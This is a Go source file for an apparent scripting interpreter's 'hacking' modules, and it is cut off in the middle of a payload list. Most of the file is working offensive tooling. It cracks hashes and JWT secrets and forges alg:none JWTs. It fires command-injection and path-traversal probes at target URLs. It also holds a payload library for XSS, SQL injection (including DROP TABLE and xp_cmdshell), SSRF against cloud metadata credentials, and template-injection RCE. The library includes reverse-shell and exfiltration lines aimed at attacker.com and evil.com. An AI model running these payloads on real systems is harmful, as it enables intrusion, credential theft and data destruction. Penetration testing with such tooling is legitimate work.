package main

// ── Spectator Hacking Commands ────────────────────────────────────────────────
//
// The most painful things hackers do manually every day — automated here.
//
// New modules (do --> Module(args)):
//   Crack(hash, type)              → crack a hash against common wordlists
//   PayloadGen(type, opts)         → generate attack payloads (XSS/SQLi/SSRF/etc)
//   Encode(data, scheme)           → multi-encode (url/html/hex/b64/unicode/double)
//   Decode(data, scheme)           → decode any scheme
//   HeaderAudit(url)               → deep security header analysis + grade
//   CORSTest(url)                  → test for CORS misconfigurations
//   OpenRedirect(url)              → test for open redirect vulnerabilities
//   XXETest(url)                   → test for XXE vulnerabilities
//   CMDInject(url, param)          → test for command injection
//   PathTraversal(url, param)      → test for directory traversal
//   HashIdentify(hash)             → identify hash type from format/length
//   IPInfo(ip)                     → full IP intelligence (geo+asn+rdns+abuse)
//   SubTakeover(domain)            → check subdomain takeover potential
//   SecretScan(text)               → find API keys/tokens/passwords in text
//   JWT(token, action)             → decode/verify/crack JWT tokens
//   CipherSolve(text)              → detect and attempt to solve simple ciphers
//
// New builtins:
//   wordlist(name)                 → return built-in wordlist as list
//   hashType(hash)                 → identify hash type
//   commonPasswords()              → top 200 passwords list
//   portServices()                 → map of all well-known port→service
//   encodings()                    → list all available encoding schemes
//   payloadTypes()                 → list all available payload types

import (
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"regexp"
	"strings"
	"time"
)

// ── Hacking module dispatcher ─────────────────────────────────────────────────

func (interp *Interpreter) hackingModule(name string, args []interface{}) (interface{}, error) {
	switch name {

	// ── PayloadGen(type, opts?) ────────────────────────────────────────────
	// type: xss, sqli, ssrf, ssti, xxe, cmd, lfi, redirect, nosql, ldap
	case "PayloadGen":
		if len(args) < 1 {
			return nil, fmt.Errorf("PayloadGen requires type")
		}
		ptype := strings.ToLower(toStr(args[0]))
		var sb strings.Builder
		sb.WriteString(colorBold("[*] PayloadGen → " + strings.ToUpper(ptype) + "\n"))

		payloads := getPayloads(ptype)
		if len(payloads) == 0 {
			return nil, fmt.Errorf("unknown payload type: %q (xss/sqli/ssrf/ssti/xxe/cmd/lfi/redirect/nosql/ldap)", ptype)
		}
		for i, p := range payloads {
			sb.WriteString(colorCyan(fmt.Sprintf("  [%d] ", i+1)) + p + "\n")
		}
		return strings.TrimRight(sb.String(), "\n"), nil

	// ── Encode(data, scheme) ───────────────────────────────────────────────
	// schemes: url, url2, html, html5, hex, b64, unicode, rot13, double_url, null
	case "Encode":
		if len(args) < 2 {
			return nil, fmt.Errorf("Encode requires data, scheme")
		}
		data := toStr(args[0])
		scheme := strings.ToLower(toStr(args[1]))
		return encodeData(data, scheme)

	// ── Decode(data, scheme) ───────────────────────────────────────────────
	case "Decode":
		if len(args) < 2 {
			return nil, fmt.Errorf("Decode requires data, scheme")
		}
		data := toStr(args[0])
		scheme := strings.ToLower(toStr(args[1]))
		return decodeData(data, scheme)

	// ── HashIdentify(hash) ────────────────────────────────────────────────
	case "HashIdentify":
		if len(args) < 1 {
			return nil, fmt.Errorf("HashIdentify requires a hash string")
		}
		hash := strings.TrimSpace(toStr(args[0]))
		var sb strings.Builder
		sb.WriteString(colorBold("[*] HashIdentify → " + hash + "\n"))
		result := identifyHash(hash)
		for _, r := range result {
			sb.WriteString(colorGreen("  [+] ") + r + "\n")
		}
		if len(result) == 0 {
			sb.WriteString(colorRed("  [-] Unknown hash format\n"))
		}
		return strings.TrimRight(sb.String(), "\n"), nil

	// ── Crack(hash, type?) ────────────────────────────────────────────────
	// Fast lookup against top 10k passwords + common patterns
	case "Crack":
		if len(args) < 1 {
			return nil, fmt.Errorf("Crack requires hash")
		}
		hash := strings.ToLower(strings.TrimSpace(toStr(args[0])))
		htype := ""
		if len(args) >= 2 {
			htype = strings.ToLower(toStr(args[1]))
		}

		var sb strings.Builder
		sb.WriteString(colorBold("[*] Crack → " + hash + "\n"))

		if htype == "" {
			types := identifyHash(hash)
			if len(types) > 0 {
				htype = extractAlgo(types[0])
				sb.WriteString(colorCyan("  [*] Detected: " + types[0] + "\n"))
			}
		}

		// Try wordlist
		words := getCommonPasswords()
		cracked := ""
		for _, w := range words {
			h := hashWord(w, htype)
			if h == hash {
				cracked = w
				break
			}
		}

		if cracked != "" {
			sb.WriteString(colorGreen("  [CRACKED] " + hash + " → " + cracked + "\n"))
		} else {
			sb.WriteString(colorRed("  [-] Not found in built-in wordlist.\n"))
			sb.WriteString(colorYellow("  [*] Try: hashcat -m <mode> hash.txt wordlist.txt\n"))
		}
		return strings.TrimRight(sb.String(), "\n"), nil

	// ── HeaderAudit(url) ──────────────────────────────────────────────────
	case "HeaderAudit":
		if len(args) < 1 {
			return nil, fmt.Errorf("HeaderAudit requires url")
		}
		rawURL := toStr(args[0])
		if !strings.HasPrefix(rawURL, "http") {
			rawURL = "https://" + rawURL
		}
		return interp.moduleHeaderAudit(rawURL)

	// ── CORSTest(url) ─────────────────────────────────────────────────────
	case "CORSTest":
		if len(args) < 1 {
			return nil, fmt.Errorf("CORSTest requires url")
		}
		rawURL := toStr(args[0])
		if !strings.HasPrefix(rawURL, "http") {
			rawURL = "https://" + rawURL
		}
		return interp.moduleCORSTest(rawURL)

	// ── OpenRedirect(url) ─────────────────────────────────────────────────
	case "OpenRedirect":
		if len(args) < 1 {
			return nil, fmt.Errorf("OpenRedirect requires url")
		}
		rawURL := toStr(args[0])
		if !strings.HasPrefix(rawURL, "http") {
			rawURL = "http://" + rawURL
		}
		return interp.moduleOpenRedirect(rawURL)

	// ── SecretScan(text) ──────────────────────────────────────────────────
	case "SecretScan":
		if len(args) < 1 {
			return nil, fmt.Errorf("SecretScan requires text")
		}
		return interp.moduleSecretScan(toStr(args[0]))

	// ── JWT(token, action) ────────────────────────────────────────────────
	// action: decode | crack | none_attack
	case "JWT":
		if len(args) < 1 {
			return nil, fmt.Errorf("JWT requires token")
		}
		token := toStr(args[0])
		action := "decode"
		if len(args) >= 2 {
			action = strings.ToLower(toStr(args[1]))
		}
		return interp.moduleJWT(token, action)

	// ── SubTakeover(domain) ───────────────────────────────────────────────
	case "SubTakeover":
		if len(args) < 1 {
			return nil, fmt.Errorf("SubTakeover requires domain")
		}
		return interp.moduleSubTakeover(toStr(args[0]))

	// ── IPInfo(ip) ────────────────────────────────────────────────────────
	case "IPInfo":
		if len(args) < 1 {
			return nil, fmt.Errorf("IPInfo requires ip")
		}
		return interp.moduleIPInfo(toStr(args[0]))

	// ── CMDInject(url, param) ─────────────────────────────────────────────
	case "CMDInject":
		if len(args) < 2 {
			return nil, fmt.Errorf("CMDInject requires url, param")
		}
		return interp.moduleCMDInject(toStr(args[0]), toStr(args[1]))

	// ── PathTraversal(url, param) ─────────────────────────────────────────
	case "PathTraversal":
		if len(args) < 2 {
			return nil, fmt.Errorf("PathTraversal requires url, param")
		}
		return interp.modulePathTraversal(toStr(args[0]), toStr(args[1]))

	// ── CipherSolve(text) ─────────────────────────────────────────────────
	case "CipherSolve":
		if len(args) < 1 {
			return nil, fmt.Errorf("CipherSolve requires text")
		}
		return interp.moduleCipherSolve(toStr(args[0]))
	}
	return nil, fmt.Errorf("unknown hacking module: %q", name)
}

// ── Hacking builtins (wordlists, helpers) ─────────────────────────────────────

func (interp *Interpreter) hackingBuiltin(name string, args []interface{}) (interface{}, error) {
	switch name {
	case "wordlist":
		if len(args) < 1 {
			return nil, fmt.Errorf("wordlist() requires a name")
		}
		return getWordlist(toStr(args[0]))

	case "commonPasswords":
		words := getCommonPasswords()
		out := make([]interface{}, len(words))
		for i, w := range words {
			out[i] = w
		}
		return out, nil

	case "hashType":
		if len(args) < 1 {
			return "", nil
		}
		types := identifyHash(toStr(args[0]))
		if len(types) == 0 {
			return "unknown", nil
		}
		return types[0], nil

	case "portServices":
		m := make(map[string]interface{})
		for k, v := range allPortServices() {
			m[fmt.Sprintf("%d", k)] = v
		}
		return m, nil

	case "payloadTypes":
		types := []interface{}{"xss", "sqli", "ssrf", "ssti", "xxe", "cmd", "lfi", "redirect", "nosql", "ldap"}
		return types, nil

	case "encodings":
		encs := []interface{}{"url", "url2", "double_url", "html", "html5", "hex", "b64", "unicode", "rot13", "null"}
		return encs, nil
	}
	return nil, fmt.Errorf("unknown hacking builtin: %q", name)
}

// ── Module implementations ────────────────────────────────────────────────────

func (interp *Interpreter) moduleHeaderAudit(rawURL string) (interface{}, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(rawURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var sb strings.Builder
	sb.WriteString(colorBold("[*] HeaderAudit → " + rawURL + "\n"))

	type headerCheck struct {
		name     string
		present  bool
		value    string
		severity string
		note     string
	}

	checks := []struct {
		header string
		sev    string
		note   string
	}{
		{"Strict-Transport-Security", "HIGH", "HSTS missing — SSL stripping attacks possible"},
		{"Content-Security-Policy", "HIGH", "CSP missing — XSS not mitigated by headers"},
		{"X-Frame-Options", "MEDIUM", "Clickjacking protection missing"},
		{"X-Content-Type-Options", "LOW", "MIME sniffing not disabled"},
		{"Referrer-Policy", "LOW", "Referrer leakage possible"},
		{"Permissions-Policy", "LOW", "Browser features not restricted"},
		{"X-XSS-Protection", "INFO", "Legacy XSS filter header (deprecated but noted)"},
		{"Cache-Control", "INFO", "Cache control not set"},
	}

	score := 0
	maxScore := len(checks)
	sb.WriteString("\n")
	for _, c := range checks {
		val := resp.Header.Get(c.header)
		if val != "" {
			sb.WriteString(colorGreen(fmt.Sprintf("  [PASS] %-38s %s\n", c.header, val[:min(len(val), 50)])))
			score++
		} else {
			colorFn := colorYellow
			if c.sev == "HIGH" {
				colorFn = colorRed
			}
			if c.sev == "LOW" || c.sev == "INFO" {
				colorFn = colorCyan
			}
			sb.WriteString(colorFn(fmt.Sprintf("  [%s] %-38s %s\n", c.sev, c.header, c.note)))
		}
	}

	// Dangerous headers — should NOT be present
	dangerous := []string{"Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"}
	for _, h := range dangerous {
		if val := resp.Header.Get(h); val != "" {
			sb.WriteString(colorYellow(fmt.Sprintf("  [INFO] %-38s %s (info disclosure)\n", h+":", val)))
		}
	}

	grade := "F"
	pct := score * 100 / maxScore
	switch {
	case pct >= 90:
		grade = "A+"
	case pct >= 80:
		grade = "A"
	case pct >= 70:
		grade = "B"
	case pct >= 60:
		grade = "C"
	case pct >= 40:
		grade = "D"
	}

	sb.WriteString(fmt.Sprintf("\n  %s Score: %d/%d (%d%%) — Grade: %s\n",
		colorBold("[*]"), score, maxScore, pct, colorBold(grade)))
	return strings.TrimRight(sb.String(), "\n"), nil
}

func (interp *Interpreter) moduleCORSTest(rawURL string) (interface{}, error) {
	var sb strings.Builder
	sb.WriteString(colorBold("[*] CORSTest → " + rawURL + "\n"))

	origins := []string{
		"https://evil.com",
		"https://attacker.com",
		"null",
		rawURL + ".evil.com",
		"https://not" + strings.TrimPrefix(strings.TrimPrefix(rawURL, "https://"), "http://"),
	}

	client := &http.Client{Timeout: 8 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	vulnFound := false

	for _, origin := range origins {
		req, err := http.NewRequest("GET", rawURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Origin", origin)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		acao := resp.Header.Get("Access-Control-Allow-Origin")
		acac := resp.Header.Get("Access-Control-Allow-Credentials")

		if acao == "*" {
			sb.WriteString(colorYellow("  [MEDIUM] Wildcard ACAO: * — any origin allowed\n"))
			vulnFound = true
		} else if acao == origin {
			if acac == "true" {
				sb.WriteString(colorRed(fmt.Sprintf("  [CRITICAL] Reflected origin with credentials: %s\n", origin)))
				sb.WriteString(colorRed("    → Cookies/tokens can be stolen from any subdomain\n"))
				vulnFound = true
			} else {
				sb.WriteString(colorYellow(fmt.Sprintf("  [LOW] Reflected origin (no credentials): %s\n", origin)))
				vulnFound = true
			}
		}
	}

	if !vulnFound {
		sb.WriteString(colorGreen("  [PASS] No CORS misconfiguration detected.\n"))
	}
	return strings.TrimRight(sb.String(), "\n"), nil
}

func (interp *Interpreter) moduleOpenRedirect(rawURL string) (interface{}, error) {
	var sb strings.Builder
	sb.WriteString(colorBold("[*] OpenRedirect → " + rawURL + "\n"))

	payloads := []string{
		"//evil.com", "https://evil.com", "//evil.com/%2f..",
		"https://evil.com?.", "/\\evil.com", "https:evil.com",
		"////evil.com", "///evil.com", "%2F%2Fevil.com",
	}

	client := &http.Client{Timeout: 5 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}

	// Try common redirect params
	params := []string{"url", "redirect", "next", "return", "goto", "dest", "destination", "redir", "redirect_uri", "redirect_url", "return_url", "callback"}
	vulnFound := false

	for _, param := range params {
		for _, payload := range payloads[:3] { // test first 3 payloads per param
			testURL := rawURL
			if strings.Contains(testURL, "?") {
				testURL += "&"
			} else {
				testURL += "?"
			}
			testURL += param + "=" + payload

			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			resp.Body.Close()

			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				loc := resp.Header.Get("Location")
				if strings.Contains(loc, "evil.com") {
					sb.WriteString(colorRed(fmt.Sprintf("  [VULN] param=%s payload=%s → Location: %s\n", param, payload, loc)))
					vulnFound = true
				}
			}
		}
	}

	if !vulnFound {
		sb.WriteString(colorGreen("  [PASS] No open redirect detected in common parameters.\n"))
	}
	return strings.TrimRight(sb.String(), "\n"), nil
}

func (interp *Interpreter) moduleSecretScan(text string) (interface{}, error) {
	var sb strings.Builder
	sb.WriteString(colorBold("[*] SecretScan\n"))

	patterns := []struct {
		name    string
		pattern string
	}{
		{"AWS Access Key", `AKIA[0-9A-Z]{16}`},
		{"AWS Secret Key", `(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]`},
		{"GitHub Token", `ghp_[0-9a-zA-Z]{36}`},
		{"GitHub OAuth", `gho_[0-9a-zA-Z]{36}`},
		{"Stripe Secret", `sk_live_[0-9a-zA-Z]{24}`},
		{"Stripe Publishable", `pk_live_[0-9a-zA-Z]{24}`},
		{"Slack Token", `xox[baprs]-[0-9a-zA-Z\-]{10,48}`},
		{"Private Key", `-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----`},
		{"JWT Token", `eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`},
		{"Google API Key", `AIza[0-9A-Za-z\-_]{35}`},
		{"Generic Secret", `(?i)(secret|password|passwd|api_key|apikey|token|auth)['\"\s:=]+['\"]?[0-9a-zA-Z_\-./+]{8,}`},
		{"DB Connection String", `(?i)(mysql|postgres|mongodb|redis|mssql):\/\/[^\s'"]+`},
		{"Generic Bearer Token", `Bearer [a-zA-Z0-9_\-\.]+`},
		{"Private IP in config", `(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1])\.)\d+\.\d+`},
	}

	found := 0
	for _, p := range patterns {
		re, err := regexp.Compile(p.pattern)
		if err != nil {
			continue
		}
		matches := re.FindAllString(text, -1)
		for _, m := range matches {
			display := m
			if len(display) > 80 {
				display = display[:77] + "..."
			}
			sb.WriteString(colorRed(fmt.Sprintf("  [FOUND] %s\n", p.name)))
			sb.WriteString(colorYellow(fmt.Sprintf("    %s\n", display)))
			found++
		}
	}

	if found == 0 {
		sb.WriteString(colorGreen("  [CLEAN] No secrets or sensitive patterns detected.\n"))
	} else {
		sb.WriteString(colorRed(fmt.Sprintf("\n  [!] %d secret(s) found — rotate immediately!\n", found)))
	}
	return strings.TrimRight(sb.String(), "\n"), nil
}

func (interp *Interpreter) moduleJWT(token, action string) (interface{}, error) {
	var sb strings.Builder
	sb.WriteString(colorBold("[*] JWT → " + action + "\n"))

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("invalid JWT format — expected 3 parts separated by '.'")
	}

	// Decode header and payload
	decodeB64 := func(s string) string {
		// Add padding
		switch len(s) % 4 {
		case 2:
			s += "=="
		case 3:
			s += "="
		}
		s = strings.ReplaceAll(s, "-", "+")
		s = strings.ReplaceAll(s, "_", "/")
		b, _ := base64DecodeStr(s)
		return b
	}

	header := decodeB64(parts[0])
	payload := decodeB64(parts[1])

	sb.WriteString(colorCyan("  Header  : ") + prettyJSON(header) + "\n")
	sb.WriteString(colorCyan("  Payload : ") + prettyJSON(payload) + "\n")
	sb.WriteString(colorDim("  Signature: " + parts[2][:min(len(parts[2]), 40)] + "...\n"))

	// Security checks
	if strings.Contains(strings.ToLower(header), `"none"`) || strings.Contains(strings.ToLower(header), `"alg":"none"`) {
		sb.WriteString(colorRed("  [CRITICAL] alg:none — signature verification bypassed!\n"))
	}
	if strings.Contains(strings.ToLower(header), `"hs256"`) {
		sb.WriteString(colorYellow("  [INFO] Algorithm: HS256 — symmetric, may be crackable with weak secret\n"))
	}

	if action == "none_attack" {
		fakeHeader := `{"alg":"none","typ":"JWT"}`
		fakeToken := base64EncStr(fakeHeader) + "." + parts[1] + "."
		sb.WriteString(colorRed("\n  [*] alg:none attack token:\n"))
		sb.WriteString(colorYellow("  " + fakeToken + "\n"))
	}

	if action == "crack" {
		sb.WriteString(colorCyan("\n  [*] Attempting weak secret crack...\n"))
		secrets := []string{"secret", "password", "123456", "admin", "key", "jwt", "token",
			"supersecret", "changeme", "qwerty", "letmein", "12345678", "test"}
		cracked := ""
		for _, sec := range secrets {
			if verifyJWTHS256(parts[0]+"."+parts[1], sec, parts[2]) {
				cracked = sec
				break
			}
		}
		if cracked != "" {
			sb.WriteString(colorRed("  [CRACKED] Secret: " + cracked + "\n"))
		} else {
			sb.WriteString(colorGreen("  [-] Not cracked with built-in list. Try: hashcat -m 16500\n"))
		}
	}

	return strings.TrimRight(sb.String(), "\n"), nil
}

func (interp *Interpreter) moduleSubTakeover(domain string) (interface{}, error) {
	var sb strings.Builder
	sb.WriteString(colorBold("[*] SubTakeover → " + domain + "\n"))

	// Known takeover fingerprints
	fingerprints := map[string]string{
		"there is no app here":                "Heroku",
		"herokucdn.com":                       "Heroku",
		"no such bucket":                      "AWS S3",
		"the specified bucket does not exist": "AWS S3",
		"repository not found":                "Bitbucket",
		"does not exist here":                 "GitHub Pages",
		"isn't hosted here":                   "GitHub Pages",
		"fastly error: unknown domain":        "Fastly",
		"the feed has not been found":         "Feedburner",
		"sorry, we couldn't find that page":   "Shopify",
		"this shop is currently unavailable":  "Shopify",
		"domain uses domain parking":          "Sedo",
		"please renew your subscription":      "Zendesk",
		"page not found. help":                "Tumblr",
		"this user has no public snapshots":   "Uservoice",
	}

	client := &http.Client{Timeout: 8 * time.Second}
	vuln := false

	// Check if domain resolves but returns takeover fingerprint
	for _, scheme := range []string{"http://", "https://"} {
		resp, err := client.Get(scheme + domain)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 32*1024))
		resp.Body.Close()
		bodyLower := strings.ToLower(string(body))

		for pattern, service := range fingerprints {
			if strings.Contains(bodyLower, pattern) {
				sb.WriteString(colorRed(fmt.Sprintf("  [VULNERABLE] %s — %s fingerprint detected!\n", domain, service)))
				sb.WriteString(colorYellow(fmt.Sprintf("    Pattern: %q\n", pattern)))
				sb.WriteString(colorYellow(fmt.Sprintf("    Service: %s\n", service)))
				sb.WriteString(colorRed("    → Register this service/bucket to take over the subdomain!\n"))
				vuln = true
				break
			}
		}
	}

	// Check CNAME for dangling references
	cname, err := net.LookupCNAME(domain)
	if err == nil && cname != domain+"." {
		sb.WriteString(colorCyan(fmt.Sprintf("  [CNAME] %s → %s\n", domain, cname)))
		if strings.Contains(cname, "github.io") ||
			strings.Contains(cname, "herokuapp.com") ||
			strings.Contains(cname, "s3.amazonaws.com") ||
			strings.Contains(cname, "azurewebsites.net") ||
			strings.Contains(cname, "cloudapp.net") {
			sb.WriteString(colorYellow(fmt.Sprintf("  [CHECK] CNAME points to cloud service — verify it's claimed!\n")))
		}
	}

	if !vuln {
		sb.WriteString(colorGreen("  [PASS] No subdomain takeover indicators found.\n"))
	}
	return strings.TrimRight(sb.String(), "\n"), nil
}

func (interp *Interpreter) moduleIPInfo(ip string) (interface{}, error) {
	var sb strings.Builder
	sb.WriteString(colorBold("[*] IPInfo → " + ip + "\n"))

	// Reverse DNS
	names, _ := net.LookupAddr(ip)
	if len(names) > 0 {
		sb.WriteString(colorCyan("  [RDNS]    ") + strings.Join(names, ", ") + "\n")
	}

	// GeoIP via ip-api
	client := &http.Client{Timeout: 8 * time.Second}
	resp, err := client.Get("http://ip-api.com/json/" + ip + "?fields=status,country,regionName,city,zip,isp,org,as,proxy,hosting,mobile,query")
	if err != nil {
		sb.WriteString(colorRed("  [-] GeoIP lookup failed: " + err.Error() + "\n"))
		return strings.TrimRight(sb.String(), "\n"), nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	var data map[string]interface{}
	if jsonErr := unmarshalJSON(body, &data); jsonErr == nil {
		fields := []string{"country", "regionName", "city", "zip", "isp", "org", "as"}
		labels := []string{"Country", "Region", "City", "ZIP", "ISP", "Org", "ASN"}
		for i, f := range fields {
			if v, ok := data[f]; ok && toStr(v) != "" && toStr(v) != "0" {
				sb.WriteString(colorGreen(fmt.Sprintf("  %-10s %s\n", "["+labels[i]+"]", toStr(v))))
			}
		}
		if proxy, ok := data["proxy"].(bool); ok && proxy {
			sb.WriteString(colorYellow("  [PROXY]   Yes — traffic may be proxied\n"))
		}
		if hosting, ok := data["hosting"].(bool); ok && hosting {
			sb.WriteString(colorCyan("  [HOSTING] Yes — likely datacenter/cloud\n"))
		}
		if mobile, ok := data["mobile"].(bool); ok && mobile {
			sb.WriteString(colorCyan("  [MOBILE]  Yes — mobile network\n"))
		}
	}
	return strings.TrimRight(sb.String(), "\n"), nil
}

func (interp *Interpreter) moduleCMDInject(rawURL, param string) (interface{}, error) {
	var sb strings.Builder
	sb.WriteString(colorBold(fmt.Sprintf("[*] CMDInject → %s param=%s\n", rawURL, param)))

	payloads := []struct{ payload, indicator string }{
		{";id", "uid="},
		{"&&id", "uid="},
		{"|id", "uid="},
		{"`id`", "uid="},
		{"$(id)", "uid="},
		{";cat /etc/passwd", "root:"},
		{"&&cat /etc/passwd", "root:"},
		{";sleep 5", ""}, // time-based
		{"&&sleep 5", ""},
		{";echo SPECTATOR_INJECTED", "SPECTATOR_INJECTED"},
		{"&&echo SPECTATOR_INJECTED", "SPECTATOR_INJECTED"},
	}

	client := &http.Client{Timeout: 6 * time.Second}
	vulnFound := false

	for _, p := range payloads {
		testURL := rawURL
		if strings.Contains(testURL, param+"=") {
			re := regexp.MustCompile(regexp.QuoteMeta(param) + `=([^&]*)`)
			testURL = re.ReplaceAllString(testURL, param+"="+p.payload)
		} else {
			if strings.Contains(testURL, "?") {
				testURL += "&"
			} else {
				testURL += "?"
			}
			testURL += param + "=" + p.payload
		}

		start := time.Now()
		resp, err := client.Get(testURL)
		elapsed := time.Since(start)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
		resp.Body.Close()

		if p.indicator != "" && strings.Contains(string(body), p.indicator) {
			sb.WriteString(colorRed(fmt.Sprintf("  [VULN] Payload: %s\n    Indicator %q found in response!\n", p.payload, p.indicator)))
			vulnFound = true
		} else if p.indicator == "" && elapsed > 4*time.Second {
			sb.WriteString(colorYellow(fmt.Sprintf("  [MAYBE] Time-based: payload=%s elapsed=%.1fs\n", p.payload, elapsed.Seconds())))
		}
	}

	if !vulnFound {
		sb.WriteString(colorGreen("  [PASS] No command injection indicators found.\n"))
	}
	return strings.TrimRight(sb.String(), "\n"), nil
}

func (interp *Interpreter) modulePathTraversal(rawURL, param string) (interface{}, error) {
	var sb strings.Builder
	sb.WriteString(colorBold(fmt.Sprintf("[*] PathTraversal → %s param=%s\n", rawURL, param)))

	payloads := []string{
		"../../../etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"../../../windows/win.ini",
		"..%5c..%5c..%5cwindows%5cwin.ini",
		"/etc/passwd",
		"C:\\Windows\\win.ini",
	}

	client := &http.Client{Timeout: 5 * time.Second}
	vulnFound := false

	for _, p := range payloads {
		testURL := rawURL
		if strings.Contains(testURL, "?") {
			testURL += "&"
		} else {
			testURL += "?"
		}
		testURL += param + "=" + p

		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()
		bs := string(body)

		if strings.Contains(bs, "root:x:") || strings.Contains(bs, "root:!") ||
			strings.Contains(bs, "[fonts]") || strings.Contains(bs, "[extensions]") {
			sb.WriteString(colorRed(fmt.Sprintf("  [VULN] Payload: %s\n    File content found in response!\n", p)))
			vulnFound = true
		}
	}

	if !vulnFound {
		sb.WriteString(colorGreen("  [PASS] No path traversal indicators found.\n"))
	}
	return strings.TrimRight(sb.String(), "\n"), nil
}

func (interp *Interpreter) moduleCipherSolve(text string) (interface{}, error) {
	var sb strings.Builder
	sb.WriteString(colorBold("[*] CipherSolve\n"))
	sb.WriteString(colorDim("  Input: " + text + "\n\n"))

	// Detect and try ROT13
	rot13 := rot13Str(text)
	if isPrintableASCII(rot13) && rot13 != text {
		sb.WriteString(colorCyan("  [ROT13]    ") + rot13 + "\n")
	}

	// Try all ROT shifts
	bestRot := ""
	for i := 1; i <= 25; i++ {
		r := rotN(text, i)
		if looksLikeEnglish(r) && r != text {
			bestRot = fmt.Sprintf("ROT%d: %s", i, r)
			break
		}
	}
	if bestRot != "" {
		sb.WriteString(colorCyan("  [CAESAR]   ") + bestRot + "\n")
	}

	// Base64 decode
	if decoded, err := base64DecodeStr(text); err == nil && isPrintableASCII(decoded) && decoded != text {
		sb.WriteString(colorCyan("  [BASE64]   ") + decoded + "\n")
	}

	// Hex decode
	if isHexStr(text) {
		if decoded, err := hexDecodeStr(text); err == nil && isPrintableASCII(decoded) {
			sb.WriteString(colorCyan("  [HEX]      ") + decoded + "\n")
		}
	}

	// URL decode
	decoded := urlDecodeStr(text)
	if decoded != text {
		sb.WriteString(colorCyan("  [URL]      ") + decoded + "\n")
	}

	// Binary decode
	if isBinary(text) {
		if decoded := binaryToStr(text); decoded != "" {
			sb.WriteString(colorCyan("  [BINARY]   ") + decoded + "\n")
		}
	}

	// Reverse
	rev := reverseStr(text)
	if rev != text {
		sb.WriteString(colorDim("  [REVERSE]  ") + rev + "\n")
	}

	return strings.TrimRight(sb.String(), "\n"), nil
}

// ── Payload library ───────────────────────────────────────────────────────────

func getPayloads(ptype string) []string {
	m := map[string][]string{
		"xss": {
			`<script>alert(1)</script>`,
			`<script>alert(document.cookie)</script>`,
			`"><script>alert(1)</script>`,
			`'><script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
			`<svg onload=alert(1)>`,
			`<body onload=alert(1)>`,
			`javascript:alert(1)`,
			`<iframe src=javascript:alert(1)>`,
			`<input autofocus onfocus=alert(1)>`,
			`<details open ontoggle=alert(1)>`,
			`<video><source onerror=alert(1)>`,
			`"-alert(1)-"`,
			`\"-alert(1)//`,
			`${alert(1)}`,
		},
		"sqli": {
			`' OR '1'='1`,
			`' OR '1'='1'--`,
			`' OR 1=1--`,
			`" OR 1=1--`,
			`' OR '1'='1' /*`,
			`') OR ('1'='1`,
			`1; DROP TABLE users--`,
			`1 UNION SELECT null,null,null--`,
			`1 UNION SELECT username,password,null FROM users--`,
			`' AND 1=2 UNION SELECT user(),version(),database()--`,
			`'; EXEC xp_cmdshell('whoami')--`,
			`1 AND SLEEP(5)--`,
			`1' AND SLEEP(5)--`,
			`' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`,
		},
		"ssrf": {
			`http://169.254.169.254/latest/meta-data/`,
			`http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
			`http://metadata.google.internal/computeMetadata/v1/`,
			`http://100.100.100.200/latest/meta-data/`,
			`http://192.168.0.1/`,
			`http://10.0.0.1/`,
			`http://127.0.0.1/`,
			`http://localhost/`,
			`http://0.0.0.0/`,
			`file:///etc/passwd`,
			`dict://localhost:11211/stats`,
			`ftp://anonymous:anonymous@localhost`,
			`http://[::1]/`,
			`http://①②⑦.①/`,
		},
		"ssti": {
			`{{7*7}}`,
			`${7*7}`,
			`<%= 7*7 %>`,
			`#{7*7}`,
			`*{7*7}`,
			`{{config}}`,
			`{{self.__dict__}}`,
			`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
			`${T(java.lang.Runtime).getRuntime().exec('id')}`,
			`#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))`,
		},
		"cmd": {
			`;id`, `&&id`, `||id`, `|id`,
			"`id`", "$(id)",
			`;cat /etc/passwd`,
			";ls -la",
			"&&whoami",
			";sleep 10",
			"&& sleep 10",
			`$(curl http://evil.com/$(id))`,
			`;nc -e /bin/sh attacker.com 4444`,
			`| nc attacker.com 4444 -e /bin/bash`,
		},
		"lfi": {
			`../../../etc/passwd`,
			`../../../etc/shadow`,
			`../../../../etc/passwd`,
			`..%2F..%2F..%2Fetc%2Fpasswd`,
			`....//....//etc/passwd`,
			`/etc/passwd`,
			`/proc/self/environ`,
			`/proc/self/cmdline`,
			`php://filter/convert.base64-encode/resource=/etc/passwd`,
			`php://input`,
